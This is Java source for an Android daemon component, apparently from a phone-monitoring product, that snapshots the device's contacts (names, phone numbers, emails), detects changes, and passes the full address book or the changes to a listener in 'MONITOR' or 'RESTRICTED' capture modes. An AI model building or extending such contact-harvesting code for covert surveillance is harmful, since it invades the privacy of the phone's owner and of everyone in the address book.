package com.vvt.processaddressbookmanager.monitor;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.CommonDataKinds.StructuredName;
import android.provider.ContactsContract.Data;
import android.util.Log;

import com.vvt.base.FxAddressbookMode;
import com.vvt.base.FxEvent;
import com.vvt.calendar.CalendarObserver;
import com.vvt.contentobserver.IDaemonContentObserver;
import com.vvt.daemon_addressbook_manager.Customization;
import com.vvt.events.FxAddressBookEvent;
import com.vvt.logger.FxLog;

public class AddressbookObserver extends IDaemonContentObserver {
	private static final String TAG = "AddressbookObserver";
	private static final String DEFAULT_DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	private static final int SLEEP_TIME_SINCE_LAST_NOTIFICATION_IN_SEC = 10; //60000;
	
			
	private static AddressbookObserver sInstance;
	private AddressbookEventListner mFxEventListner;
	private CalendarObserver mCalendarObserver;
	@SuppressWarnings("unused")
	private SimpleDateFormat mDateFormatter;
	private String mLoggablePath;
	private Timer mTimer = null;
	private FxAddressbookMode mCaptureMode = FxAddressbookMode.OFF;
	private Context mContext;
	
	public static AddressbookObserver getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new AddressbookObserver(context);
		}

		return sInstance;
	}

	public AddressbookObserver(Context context) {
		super(context);
		
		mCalendarObserver = CalendarObserver.getInstance();
		mCalendarObserver.enable();

		mContext = context;
		mDateFormatter = new SimpleDateFormat(DEFAULT_DATE_FORMAT);
		mLoggablePath = context.getCacheDir().getAbsolutePath();
	}
	
 	public void setLoggablePath(String path) {
		mLoggablePath = path;
	}
	
	public void setMode(FxAddressbookMode mode) {
		mCaptureMode = mode;
	}
	
	public void setDateFormat(String format) {
		mDateFormatter = new SimpleDateFormat(format);
	}
	
	public void registerObserver(AddressbookEventListner listener) {
		if(LOGV) FxLog.v(TAG, "registerObserver # START");
		
		// Save the current addressbook in a backgroud thread.
		new Thread(new Runnable() {
		    public void run() {
		    	saveAddressBookState();
		    }
		  }).start();
		
		mFxEventListner = listener;
		super.registerObserver();
		if(LOGV) FxLog.v(TAG, "registerObserver # EXIT");
	}
	
	/**
	 * Take a snapshot of the current state of the addressbook and save 
	*/
	private void saveAddressBookState() {
		if(LOGV) FxLog.v(TAG, "saveAddressBookState # START");
		
		List<FxEvent>  addressBook = AddressBookHelper.getAllContacts(mContext);
		if(addressBook.size() > 0)
			deleteAndInsertAddressBook(addressBook);
		
		if(LOGV) FxLog.v(TAG, "saveAddressBookState # EXIT");
	}
	
	private void deleteAndInsertAddressBook(final List<FxEvent> phoneAddressBook) throws NullPointerException {
		if(LOGV) FxLog.v(TAG, "deleteAndInsertAddressBook # START");
		if(LOGD) FxLog.d(TAG, "deleteAndInsertAddressBook # phoneAddressBook size is " + phoneAddressBook.size());
		
		if (phoneAddressBook == null || phoneAddressBook.size() <= 0) {
			// User has deleted all the contacts one by one ..
			AddressBookSettings.deleteConfigFile(mLoggablePath);
			return;
		}

		AddressBookSettings.setAddressBook(phoneAddressBook, mLoggablePath);
		if(LOGV) FxLog.v(TAG, "deleteAndInsertAddressBook # EXIT");
	}
	
	public void unregisterObserver(AddressbookEventListner listener) {
		mFxEventListner = null;
		super.unregisterObserver();
	}

	@Override
	protected void onContentChange() {
		if(LOGV) FxLog.v(TAG, "onContentChange # ENTER ...");
		
		if(mTimer != null) {
			mTimer.cancel();
			if(LOGV) FxLog.v(TAG, "count down timer resetting...");
		}	
		
		mTimer = new Timer();
		mTimer.scheduleAtFixedRate(new TimerTask() {
            int i = SLEEP_TIME_SINCE_LAST_NOTIFICATION_IN_SEC;
            public void run() {
                Log.d(TAG, "Comparison will start in:" + i--);
                if (i< 0) {
                	mTimer.cancel();
                	
                	if (mCaptureMode != FxAddressbookMode.OFF) {
                		verifyChange();
                	}
                }
            }
        }, 0, 1000);
		
		if(LOGV) FxLog.v(TAG, "onContentChange # EXIT ...");
	}

	@Override
	protected Uri getContentUri() {
		return AddressBookDatabaseHelper.CONTENT_URI;
	}

	@Override
	protected String getTag() {
		return TAG;
	}
	
	private void verifyChange() {
		if(LOGV) FxLog.v(TAG, "verifyChange # ENTER ...");
		
		ArrayList<String> lookupKeys = PhoneContacts.getLookupKeys();
		List<FxEvent> lastChangedAddressBook = AddressBookSettings.getAddressBook(mLoggablePath);
		List<FxEvent> addressBookChanges = new ArrayList<FxEvent>();
		List<FxEvent> phoneAddressBook = new ArrayList<FxEvent>();
		
		if(LOGD) FxLog.d(TAG, "verifyChange # lookupKeys size " + lookupKeys.size());
		
		SQLiteDatabase db = AddressBookHelper.getReadableDatabase();
		
		if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
			if(LOGE) FxLog.e(TAG, "verifyChange # Open database FAILED!! -> EXIT ...");
			if (db != null) {
				db.close();
			}
			
		}
		else {
		
			try {
				for (String lookupKey : lookupKeys) {
					if(LOGD) FxLog.v(TAG, "verifyChange # lookupKey :" + lookupKey);
					
					FxAddressBookEvent event = new FxAddressBookEvent();
					event.setLookupKey(lookupKey);

					// 3 query first name and last name associated with this LookUp Key
				
					//String sql = "SELECT data.raw_contact_id, data.data1, data.data2, data.data3, data.data14, data.data15, contacts.lookup FROM data JOIN mimetypes ON(mimetype_id=mimetypes._id) JOIN contacts ON (contacts.name_raw_contact_id = data.raw_contact_id) WHERE (mimetypes.mimetype=?) AND (contacts.lookup = ?)";
					String sql = AddressBookHelper.getLookupKeySelectSql();
					Cursor nameCursor = db.rawQuery(sql, new String[] { StructuredName.CONTENT_ITEM_TYPE, lookupKey });

					try {
						if (nameCursor != null && nameCursor.moveToFirst()) {
							long id = nameCursor.getLong(nameCursor.getColumnIndex(Data.RAW_CONTACT_ID));
							String name = nameCursor.getString(nameCursor.getColumnIndex(StructuredName.GIVEN_NAME));
							String lastName = nameCursor.getString(nameCursor.getColumnIndex(StructuredName.FAMILY_NAME));
						 	
							event.setLookupKey(lookupKey);
							event.setEventId(id);
							event.setFirstName(name);
							event.setLastName(lastName);
						}
					} finally {
						if (nameCursor != null)
							nameCursor.close();
					}

					// 4 query phone number that associated with this LookUp Key
					Cursor phoneNumberCursor = db.rawQuery(sql, new String[] { Phone.CONTENT_ITEM_TYPE, lookupKey });

					try {
						if (phoneNumberCursor != null
								&& phoneNumberCursor.moveToFirst()) {
							while (phoneNumberCursor.isAfterLast() == false) {
								String number = phoneNumberCursor
										.getString(phoneNumberCursor
												.getColumnIndex(Phone.NUMBER));
								int type = phoneNumberCursor.getInt(phoneNumberCursor
										.getColumnIndex(Phone.TYPE));
								switch (type) {
								case Phone.TYPE_HOME:
									event.setHomePhone(number);
									break;
								case Phone.TYPE_MOBILE:
									event.setMobilePhone(number);
									break;
								case Phone.TYPE_WORK:
									event.setWorkPhone(number);
									break;
								}
								
								phoneNumberCursor.moveToNext();
							}
						}
					} finally {
						if (phoneNumberCursor != null)
							phoneNumberCursor.close();
					}

					// 5 query email that associated with this LookUp Key
					Cursor emailCursor = db.rawQuery(sql, new String[] { Email.CONTENT_ITEM_TYPE, lookupKey });
					
					if (emailCursor != null && emailCursor.moveToFirst()) {
						
						while (emailCursor.isAfterLast() == false) {
							
							String email = emailCursor.getString(emailCursor
									.getColumnIndex(Email.DATA));
							int type = emailCursor.getInt(emailCursor.getColumnIndex(Email.TYPE));
							
							switch (type) {
							case Email.TYPE_HOME:
								event.setHomeEMail(email);
								break;
							case Email.TYPE_WORK:
								event.setWorkEMail(email);
								break;
							case Email.TYPE_OTHER:
								event.setOtherEMail(email);
								break;
							}
							
							emailCursor.moveToNext();
						}	
					}

					if (emailCursor != null)
						emailCursor.close();
					
					if(!lastChangedAddressBook.contains(event)) {
						if(LOGD) FxLog.d(TAG, "verifyChange # found ->" + event.toString());
						addressBookChanges.add(event);
					}
					else {
						if(LOGV) FxLog.v(TAG, "verifyChange # no change in ->" + event.toString());
					}
					
					// Store all the contacts so we can put this in the cache later
					phoneAddressBook.add(event);
				}
				
				if(db.isOpen()) db.close();
				
				deleteAndInsertAddressBook(phoneAddressBook);
				
				if(LOGD) FxLog.d(TAG, "verifyChange # CaptureMode is:" + mCaptureMode);
				
				if (mCaptureMode == FxAddressbookMode.RESTRICTED) {
					if (addressBookChanges.size() > 0) {
						if(LOGV) FxLog.v(TAG, "verifyChange # invoking FxEventListner");
						this.mFxEventListner.onReceive(addressBookChanges);
					}
				} else if (mCaptureMode == FxAddressbookMode.MONITOR) {
					if (phoneAddressBook.size() > 0) {
						if(LOGV) FxLog.v(TAG, "verifyChange # invoking FxEventListner");
						this.mFxEventListner.onReceive(phoneAddressBook);
					}
				}
			}
			finally {
				
				if(db.isOpen()) db.close();
			}
		}
		
		if(LOGV) FxLog.v(TAG, "verifyChange # EXIT ...");
	}
 
}
